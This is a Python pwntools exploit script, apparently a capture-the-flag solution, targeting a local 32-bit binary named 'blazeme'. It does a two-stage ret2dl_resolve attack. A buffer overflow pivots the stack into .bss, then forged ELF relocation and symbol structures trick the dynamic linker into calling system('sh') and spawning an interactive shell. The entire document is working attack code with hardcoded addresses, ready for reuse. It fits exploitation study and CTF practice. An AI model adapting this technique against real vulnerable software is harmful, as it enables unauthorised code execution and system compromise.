from pwn import *

r = process("./blazeme", aslr=1)

read_plt = 0x080482f0
tmp_got = 0x0804a000

ELF_JMPREL_Rel_Tab = 0x08048298
ELF_String_Tab = 0x0804821C
ELF_Symbol_Tab = 0x080481CC

leave_ret_gdt = 0x08048388
bss_segment = 0x0804af00
_dl_resolve = 0x080482e0

pad = "A"*108

log.info("Stage 1 > Read stage2 payload and jump to stage2")
stage1 = flat(pad, p32(bss_segment), p32(read_plt), p32(leave_ret_gdt), p32(0), p32(bss_segment), p32(0x80))

r.send(stage1)
#r.interactive()

log.info("Stage 2 > Ret2dl_resolve")
crafted_area = bss_segment + 0x14
elf32_Rel_offset = crafted_area - ELF_JMPREL_Rel_Tab
elf32_Sym_offset = crafted_area + 0x8
align = 0x10 - ((elf32_Sym_offset - ELF_Symbol_Tab) % 0x10)
elf32_Sym_offset += align
elf32_Sym_index = (elf32_Sym_offset - ELF_Symbol_Tab) / 0x10 # Each index takes 0x10 bytes

elf32_Rel_r_info = (elf32_Sym_index << 8) | 0x7 # shl 1 byte and add 0x7 (R_386_JUMP_SLOT)

elf32_Rel_data = flat(p32(tmp_got), p32(elf32_Rel_r_info)) # Using tmp_got as place for resolved address

elf32_Sym_st_name = (elf32_Sym_offset + 0x10) - ELF_String_Tab
elf32_Sym_data = flat(p32(elf32_Sym_st_name), p32(0), p32(0), p32(0x12))

system_param_offset = bss_segment + 0x64
system_str = "system\x00"
system_param_str = "sh\x00"
stage2 = flat(
    "JUNK", 
    p32(_dl_resolve), 
    p32(elf32_Rel_offset), 
    "JUNK", 
    p32(system_param_offset), 
    elf32_Rel_data, 
    "A"*align, 
    elf32_Sym_data, 
    system_str)
pad = "B" * (100 - len(stage2))
stage2 += flat(
    pad, 
    system_param_str)
pad = "C" * (0x80 - len(stage2))
stage2 += flat(pad)

r.send(stage2)

log.success("Pwned!")
r.interactive()


